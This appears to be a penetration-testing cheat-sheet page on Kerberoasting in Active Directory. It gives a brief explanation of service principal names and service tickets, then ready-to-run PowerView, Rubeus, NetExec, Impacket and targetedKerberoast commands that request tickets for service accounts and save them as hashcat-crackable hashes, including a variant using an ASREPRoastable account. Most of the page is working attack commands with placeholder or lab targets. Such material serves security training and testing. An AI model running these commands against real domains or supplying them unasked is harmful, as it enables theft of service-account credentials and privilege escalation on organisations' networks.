---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Kerberoasting

## TL;DR

Kerberoasting is an attack on the ST and [SPNs](https://learn.microsoft.com/en-us/windows/win32/ad/service-principal-names). SPNs are unique IDs that Kerberos uses to map a service instance, for example MySQL, to a service sign-in account, such as `svc_mysql`, in whose, often privileged, context the service is running. The ST is encrypted with the service's account NTLM hash, so it can potentially be cracked. **Any domain user can request a ST from the DC for any SPN account**.

<figure><img src="../../../../.gitbook/assets/kerberoasting_process.png" alt=""><figcaption><p>Figure 1: The Kerberos authentication process (image taken from <a href="https://www.optiv.com/insights/source-zero/blog/kerberos-domains-achilles-heel">here</a>).</p></figcaption></figure>

Typically, [Kerberoasting](kerberoasting.md) happens after compromising a domain user. However, according to [new research](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/), it is possible to perform this attack with an account susceptible to ASREPRoast.

## Windows

{% tabs %}
{% tab title="PowerView" %}
```powershell
# confirm that the target account has SPN
Get-DomainUser 'sqldev' | Select serviceprincipalname
# kerberoast the target account
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
# Clear the SPNs of the target account
Set-DomainObject -Identity sqldev -Clear serviceprincipalname
```
{% endtab %}

{% tab title="Rubeus" %}
{% code overflow="wrap" %}
```powershell
.\Rubeus.exe kerberoast /creduser:domain\user1 /credpassword:pass /user:targetUser /outfile:hash.txt /format:hashcat /nowrap
```
{% endcode %}
{% endtab %}

{% tab title="Rubeus (ASREPRoast Acc)" %}
{% code overflow="wrap" %}
```powershell
.\Rubeus.exe kerberoast /domain:<domain> /dc:<ip> /nopreauth:<user> /spns:<username-list>
```
{% endcode %}
{% endtab %}
{% endtabs %}

For an example of Kerberoasting with Rubeus check [here](https://x7331.gitbook.io/boxes/boxes/boxes/insane/sizzle#path-to-victory).

## Linux

{% tabs %}
{% tab title="NetExec" %}
```bash
nxc ldap 192.168.0.104 -u user -p pass --kerberoasting output.txt
```
{% endtab %}

{% tab title="Impacket" %}
```bash
GetUserSPNs.py -dc-ip 172.16.5.5 DOMAIN/user -request -outputfile spns.lst
```
{% endtab %}

{% tab title="Impacket (ASREPRoast Acc)" %}
{% code overflow="wrap" %}
```bash
sudo python3 /opt/impacket/examples/GetUserSPNs.py -no-preauth jjones -usersfile dom_users -dc-host 10.10.11.231 rebound.htb/ -outputfile kerb.txt
```
{% endcode %}
{% endtab %}

{% tab title="targetedKerberoast" %}
```bash
targetedKerberoast.py -v -d <DOMAIN_FQDN> -u <USER> -p <PASSWORD>
```
{% endtab %}
{% endtabs %}

For an example of Kerberoasting with NetExec check [here](https://x7331.gitbook.io/boxes/boxes/boxes/easy/active#eop-via-kerberoasting).

## Resources

{% tabs %}
{% tab title="Demo" %}
{% embed url="https://www.youtube.com/watch?v=-3MxoxdzFNI" %}
Kerberoasting in 14 minutes!
{% endembed %}
{% endtab %}

{% tab title="GetUserSPNs" %}
{% embed url="https://www.youtube.com/watch?v=xH5T9-m9QXw" %}
How GetUserSPNs script work behind the scenes!
{% endembed %}
{% endtab %}

{% tab title="Lecture" %}
{% embed url="https://www.youtube.com/watch?v=Jaa2LmZaNeU" %}
{% endtab %}

{% tab title="Article" %}
{% embed url="https://adsecurity.org/?p=3458" %}
A great article detailing the Kerberoasting process.
{% endembed %}
{% endtab %}

{% tab title="targetedKerberoast" %}
{% embed url="https://github.com/ShutdownRepo/targetedKerberoast" %}
{% endtab %}
{% endtabs %}
